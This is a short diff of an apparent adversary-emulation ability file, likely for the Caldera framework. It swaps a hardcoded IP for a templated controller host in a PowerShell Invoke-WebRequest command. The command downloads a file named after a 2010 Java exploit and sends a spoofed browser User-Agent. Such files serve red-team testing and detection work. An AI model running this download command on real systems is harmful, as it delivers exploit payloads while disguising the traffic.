@@ -12,9 +12,10 @@
   executors:
   - name: psh
     platform: windows
-    command: 'Invoke-WebRequest -Uri "http://198.18.133.49/Java-2010-3552.jar" ` -Method
-      Get ` -Headers @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)
-      AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" } '
+    command: 'Invoke-WebRequest -Uri "http://#{caldera.host}/Java-2010-3552.jar" `
+      -Method Get ` -Headers @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64;
+      x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+      } '
     code: null
     language: null
     build_target: null
